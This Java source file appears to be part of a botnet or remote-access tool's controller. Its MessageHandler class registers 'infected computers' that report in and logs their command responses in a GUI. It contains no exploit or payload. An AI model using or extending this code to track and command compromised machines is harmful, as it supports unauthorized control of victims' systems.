package communication;

import java.net.InetAddress;
import controller.Database;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import GUI.gui;

public class MessageHandler implements Runnable {
	String msg;
	CommunicationProtocol type;
	InetAddress address;
	@Override
	public void run() {
		if(type==CommunicationProtocol.IMALIVE) {
			Database.addInfectedComputer(address, Integer.parseInt(msg));
			gui.getGui().addListOption(address.getHostAddress());
		}
		else if(type==CommunicationProtocol.RESPONSE) {
			String to_add= "["+address.getHostName()+" at " + DateTimeFormatter.ofPattern("dd/MM/yyyy - hh:mm").format(ZonedDateTime.now())+ "]: " +msg+"\n";
			Database.addResponse(address, to_add);
			gui.getGui().updateResponses();
		}
	}
	
	public MessageHandler(String msg, CommunicationProtocol type, InetAddress addr) {
		super();
		this.msg = msg;
		this.type = type;
		this.address= addr;
	}

}
